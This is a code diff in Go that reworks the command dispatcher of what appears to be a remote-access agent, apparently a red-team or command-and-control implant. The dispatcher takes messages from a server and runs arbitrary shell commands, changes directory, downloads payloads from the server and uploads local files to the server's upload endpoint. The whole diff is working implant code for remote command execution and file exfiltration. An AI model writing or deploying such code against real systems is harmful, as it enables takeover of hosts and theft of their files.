@@ -13,8 +13,27 @@ import (
 	"mime/multipart"
  )
 
- //Execute runs an arbitrary terminal command
- func Execute(command string) ([]byte, int) {
+ //RunCommand executes a given command
+ func RunCommand(message string, httpServer string) ([]byte, int) {
+   if strings.HasPrefix(message, "cd") {
+      pieces := strings.Split(message, "cd")
+      bites := changeDirectory(pieces[1])
+      return bites, 0
+   } else if (strings.HasPrefix(message, "download")) {
+      pieces := strings.Split(message, "download")
+      go download(httpServer, pieces[1])
+      return []byte("Download initiated\n"), 0
+   } else if (strings.HasPrefix(message, "upload")) {
+      pieces := strings.Split(message, "upload")
+      go upload(httpServer, pieces[1])
+      return []byte("Upload initiated\n"), 0
+   } else {
+      bites, status := execute(message)
+      return bites, status
+   }
+}
+
+ func execute(command string) ([]byte, int) {
 	var bites []byte
 	var error error
 	var status int
@@ -30,14 +49,12 @@ import (
 	return []byte(fmt.Sprintf("%s%s", bites, "\n")), status
 }
 
-//ChangeDirectory switches working directory
-func ChangeDirectory(target string) []byte {
+func changeDirectory(target string) []byte {
 	os.Chdir(strings.TrimSpace(target))
 	return []byte(" ")
 }
 
-//Download a payload from the API
-func Download(server string, file string) []byte {
+func download(server string, file string) []byte {
 	file = strings.TrimSpace(file)
 	cwd, _ := os.Getwd()
 	location := filepath.Join(cwd, file)
@@ -60,8 +77,7 @@ func Download(server string, file string) []byte {
 	return []byte(" ")
 }
 
-//Upload a file to the API
-func Upload(server string, file string, paw string) []byte {
+func upload(server string, file string) []byte {
 	file = strings.TrimSpace(file)
 	fmt.Println(fmt.Sprintf("[*] Uploading file %s", file))
 	address := fmt.Sprintf("%s/file/upload", server)
@@ -82,7 +98,6 @@ func Upload(server string, file string, paw string) []byte {
 
 	req, _ := http.NewRequest("POST", address, bodyBuf)
 	req.Header.Set("Content-Type", contentType)
-	req.Header.Set("X-Request-ID", paw)
 	client := &http.Client{}
 	resp, err := client.Do(req)
 
